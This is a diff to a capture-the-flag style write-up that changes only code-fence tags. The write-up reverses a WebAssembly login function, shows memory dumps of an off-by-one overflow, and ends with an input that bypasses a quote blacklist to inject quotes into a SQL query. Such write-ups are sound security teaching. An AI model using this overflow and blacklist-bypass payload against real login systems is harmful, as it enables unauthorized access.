@@ -156,7 +156,7 @@ main()
 
 Essentially, it converts code like 
 
-```
+```plaintext
 var c:int = g_a;
 var d:int = 160;
 var e:int = c - d;
@@ -164,13 +164,13 @@ var e:int = c - d;
 
 to
 
-```
+```plaintext
 var e:int = g_a - 160;
 ```
 
 where c and d variables are not used anywhere else. Now, the code was a bit more readable. Here is the updated craft_query function:
 
-```
+```plaintext
 export function craft_query(username:int, password:int):int {
 	var e:int = DATA - 160;
 	DATA = e;
@@ -190,7 +190,7 @@ export function craft_query(username:int, password:int):int {
 
 Next, I looked at the function `f_1`.
 
-```
+```plaintext
 function f_1(ptr:int, username:int) {
 	var e:int_ptr = DATA - 32;
 	DATA = e;
@@ -291,14 +291,14 @@ print(data[i-100:i+100])
 
 This gave the output:
 
-```
+```plaintext
 65360
 b'P\xff\x00\x00\x00\x00\x00\x00\x10\xff\x00\x00P\xff\x00\x00`\x02\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x01\x00\x00\x00B\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00\x01\x00\x00\x00\xa0\xff\x00\x00\xb0\xff\x00\x00B\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00AAAA'
 ```
 
 It seems that right after the list of As there is a 0x1 byte. The memory dump from passing 68 As as the argument shows that this byte is overwritten by a null byte.
 
-```
+```plaintext
 65360
 b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xf4\xff\x00\x00\x94\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x01\x00\x00\x00B\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00\x00\x00\x00\xa0\xff\x00\x00\xb0\xff\x00\x00B\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00AAAA'
 ```
@@ -343,7 +343,7 @@ So the function in table entry 1 is `is_blacklisted`, and the function in table 
 
 I ran the function with blacklisted characters: `CraftQuery('"'.repeat(68) + '%02', 'B')`, and sure enough, the blacklist was bypassed.
 
-```
+```sql
 SELECT * from Users WHERE username="""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""" AND password="B"
 ```
 
